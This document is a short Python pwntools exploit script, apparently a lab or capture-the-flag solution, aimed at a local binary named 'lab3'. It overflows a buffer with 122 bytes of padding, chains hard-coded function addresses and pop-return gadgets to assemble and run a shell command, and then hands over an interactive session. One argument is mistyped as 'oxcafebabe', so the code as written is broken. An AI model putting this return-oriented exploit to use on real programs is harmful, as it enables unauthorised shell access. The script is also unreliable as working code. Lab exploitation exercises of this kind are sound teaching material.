#!/usr/bin/python

from pwn import * 

def main():
    p = process("./lab3")

    add_bin = 0x0804845d
    add_bash = 0x080484a2
    exec_string = 0x0804843b

    payload = b"A" * 122

    pop_return = 0x080484a0
    pop_pop_return = 0x0804849f

    payload += p32(add_bin)
    payload += p32(pop_pop_return)
    payload += p32(0xff424242)
    payload += p32(0xdeadbeef)
    payload += p32(add_bash)
    payload += p32(pop_pop_return)
    payload += p32(0xffffaaaa)
    payload += p32(oxcafebabe)
    payload += p32(exec_string)
    payload += p32(pop_return)
    payload += p32(0xabcdabcd)

    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    main()